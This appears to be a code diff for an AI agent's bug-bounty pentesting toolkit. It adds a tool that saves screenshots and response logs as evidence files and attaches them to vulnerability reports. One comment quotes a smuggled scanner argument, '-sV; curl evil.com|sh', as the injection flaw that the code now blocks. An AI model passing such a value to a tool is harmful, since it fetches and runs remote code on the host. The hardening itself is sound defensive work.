@@ -864,9 +864,18 @@ Supports styles: 写实/插画/水墨/油画/3D/二次元/极简/奶油风 etc. 
       severity: { type: 'string', enum: ['critical','high','medium','low'], description: '严重程度' },
       vulnType: { type: 'string', description: '漏洞类型 (xss/sqli/csrf/auth_bypass/path_traversal/logic 等)' },
       poc: { type: 'string', description: '可复现的 PoC / 利用 payload' },
-      evidence: { type: 'string', description: '验证证据 (截图路径 / 关键响应片段)' },
+      evidence: { type: 'string', description: '验证证据 (关键响应片段 / 复现步骤描述)' },
+      evidencePaths: { type: 'array', items: { type: 'string' }, description: '证据文件路径数组 (截图 png / 响应日志), 由 save_evidence 生成, 提交平台时作为可下载附件' },
       platform: { type: 'string', description: '可选: 目标赏金平台 (补天/漏洞盒子/阿里SRC/HackerOne...)' },
     }, required: ['title','target','severity'] }, parallelSafe: false, riskLevel: 'low' },
+  // ===== 2026-10-16 证据链: 截图/响应落盘成实体文件, 平台提交可下载 =====
+  { name: 'save_evidence', description: '【证据落盘】把截图 (base64) 或响应文本存成 .agentai/evidence/ 下的实体文件, 返回文件路径。赏金平台提交要"可下载的截图/日志", 光在对话里显示没用。\n\n🔑 触发场景: pentest 挖到洞 → browser_screenshot 拿到 base64 截图 → save_evidence 落盘 → 把返回的 path 挂到 report_vulnerability 的 evidencePaths。多张证据可多次调, 或用 saveText 存响应片段。\n\n💡 示例: save_evidence({ title:"xss-proof", imageBase64:"<...>", target:"www.bestpay.com.cn" }) → { path:".agentai/evidence/vuln-xss-.../screenshot-1.png" }',
+    parameters: { type: 'object', properties: {
+      title: { type: 'string', description: '证据标识 (用作文件名前缀, 如 xss-proof)' },
+      imageBase64: { type: 'string', description: '截图 PNG base64 (来自 browser_screenshot 的 data.imageBase64), 与 saveText 二选一' },
+      saveText: { type: 'string', description: '要存档的文本 (响应片段 / curl 输出 / 命令结果), 与 imageBase64 二选一' },
+      target: { type: 'string', description: '关联目标 (写进证据目录名, 便于按目标归组)' },
+    }, required: ['title'] }, parallelSafe: false, riskLevel: 'low' },
   // ===== 2026-10-15 kali 扫描器 + 授权对话化 =====
   // wsl_scan: 走 WSL kali-linux 调 nmap/nuclei/sqlmap 等扫描器 (白名单 + 先过授权闸门)。
   // 本机 Windows 装不了 Kali 本体, 但 WSL 里有 kali-linux 发行版, 子智能体经 wsl_scan 真能驱动它。
@@ -2617,11 +2626,19 @@ export const EXTRA_HANDLERS: Record<string, ToolHandlerLike> = {
       // 2026-10-15 P2-1: 证据门槛 — 赏金平台"无证据不过审", 零门槛落盘已被实测污染
       // (测试残留写进真实 vulns.jsonl)。evidence 必填, status 默认 unverified,
       // AI 必须显式传 status:'verified' 才标已验证 (需附复现步骤/poc)。
+      // 证据文件: evidencePaths (截图/日志), 由 save_evidence 生成或 AI 手动传。
+      // 平台提交时这些是"可下载附件", 没有它们报告基本过不了审。
       const evidence = String(args.evidence || '').trim();
-      if (!evidence) {
+      const evidencePaths = Array.isArray(args.evidencePaths)
+        ? args.evidencePaths.map((p: any) => String(p)).filter(Boolean)
+        : (typeof args.evidencePaths === 'string' && args.evidencePaths
+            ? args.evidencePaths.split(',').map((s: string) => s.trim()).filter(Boolean)
+            : []);
+      // 证据门槛: evidence (文本) 或 evidencePaths (文件) 至少给一项
+      if (!evidence && evidencePaths.length === 0) {
         return {
           success: false,
-          output: '❌ 拒绝落盘: evidence 为空。赏金平台报告必须可复现 (请求/响应片段、截图路径、复现步骤至少给一项)。补齐后重试。',
+          output: '❌ 拒绝落盘: 无证据。请给 evidence (响应片段/复现步骤文本) 或先调 save_evidence 生成截图挂到 evidencePaths。',
         };
       }
       const status = ['unverified', 'verified', 'reported'].includes(String(args.status))
@@ -2634,7 +2651,7 @@ export const EXTRA_HANDLERS: Record<string, ToolHandlerLike> = {
         id, ts: Date.now(),
         title: args.title, target: args.target,
         severity: args.severity, vulnType: args.vulnType || 'unknown',
-        poc: args.poc || '', evidence, platform: args.platform || '',
+        poc: args.poc || '', evidence, evidencePaths, platform: args.platform || '',
         status,  // unverified(默认) / verified / reported
       };
       // 追加到 JSONL (与 memory.jsonl 同构, 跨会话可召回)
@@ -2642,7 +2659,7 @@ export const EXTRA_HANDLERS: Record<string, ToolHandlerLike> = {
       fs.appendFileSync(file, JSON.stringify(record) + '\n');
       return {
         success: true,
-        output: `✅ 漏洞已落盘: ${id} [${status}]\n标题: ${args.title}\n目标: ${args.target} (${args.severity}/${args.vulnType || 'unknown'})\n${args.platform ? `平台: ${args.platform}\n` : ''}路径: ${file}\n下次同类目标可直接召回这条参考。${status === 'unverified' ? '\n提示: 复现验证通过后可更新为 verified (赏金平台提交需 verified)。' : ''}`,
+        output: `✅ 漏洞已落盘: ${id} [${status}]\n标题: ${args.title}\n目标: ${args.target} (${args.severity}/${args.vulnType || 'unknown'})\n${args.platform ? `平台: ${args.platform}\n` : ''}证据文件: ${evidencePaths.length ? evidencePaths.join(', ') : '(仅文本证据)'}\n路径: ${file}\n下次同类目标可直接召回这条参考。${status === 'unverified' ? '\n提示: 复现验证通过后可更新为 verified (赏金平台提交需 verified)。' : ''}`,
         data: record,
       };
     } catch (e: any) { return { success: false, output: `report_vulnerability 失败: ${e.message}` }; }
@@ -2656,6 +2673,47 @@ export const EXTRA_HANDLERS: Record<string, ToolHandlerLike> = {
   // AI 传 args:["-sV; curl evil.com|sh"] 即可在 kali 执行任意命令 (白名单只锁第一个 token)。
   // 现在: ① 每参数过 assertSafeScanArg 黑名单; ② execFile argv 数组直调 wsl.exe (不走
   // cmd /c 少一层 Windows cmd 解析); ③ 执行前过共用令牌桶 (P1-2: 原实现不过限频)。
+  // ===== 2026-10-16 证据链: 截图/响应落盘成实体文件, 赏金平台提交可下载 =====
+  // 背景: browser_screenshot 的截图只进 LLM 上下文 (base64), 从不落盘; 平台要的是
+  // "可下载附件", 光对话里看过没用。本工具把证据固化到 .agentai/evidence/<目标>/,
+  // 返回路径给 report_vulnerability 的 evidencePaths 挂上 → 报告/截图/日志一个包。
+  save_evidence: async (args, ctx) => {
+    try {
+      const ws = (ctx as any)?.workspace || getWs();
+      const title = String(args.title || 'evidence').replace(/[^\w.-]/g, '_').slice(0, 32);
+      const targetSlug = String(args.target || 'no-target').replace(/[^a-z0-9.-]/gi, '_').slice(0, 64);
+      const evDir = path.join(ws, '.agentai', 'evidence', `${targetSlug}-${title}`);
+      fs.mkdirSync(evDir, { recursive: true });
+      const stamp = new Date().toISOString().replace(/[:.]/g, '-');
+      const out: string[] = [];
+
+      if (args.imageBase64) {
+        const b64 = String(args.imageBase64).replace(/^data:image\/\w+;base64,/, '');
+        // 合法 base64 且非空壳 (真实截图几 KB; 只挡空串/占位符)
+        if (/^[A-Za-z0-9+/=]+$/.test(b64) && b64.length > 8) {
+          const p = path.join(evDir, `screenshot-${stamp}.png`);
+          fs.writeFileSync(p, Buffer.from(b64, 'base64'));
+          out.push(p);
+        } else {
+          return { success: false, output: '❌ imageBase64 不是合法 base64 (或过短)。传 browser_screenshot 返回的 data.imageBase64。' };
+        }
+      }
+      if (args.saveText) {
+        const p = path.join(evDir, `response-${stamp}.txt`);
+        fs.writeFileSync(p, String(args.saveText), 'utf-8');
+        out.push(p);
+      }
+      if (out.length === 0) {
+        return { success: false, output: '❌ 无内容可存: imageBase64 与 saveText 至少给一项。' };
+      }
+      return {
+        success: true,
+        output: `✅ 证据已落盘 ${out.length} 项 → ${evDir}\n${out.map((p, i) => `  ${i + 1}. ${p}`).join('\n')}\n把这些路径传进 report_vulnerability 的 evidencePaths, 提交平台时作为附件。`,
+        data: { evidencePaths: out, dir: evDir },
+      };
+    } catch (e: any) { return { success: false, output: `save_evidence 失败: ${e.message}` }; }
+  },
+  // ===== 2026-10-15 kali 扫描器接线: wsl_scan 走 WSL kali-linux 调 nmap/nuclei/sqlmap 等 =====
   wsl_scan: async (args, ctx) => {
     try {
       const { execFile } = await import('child_process');
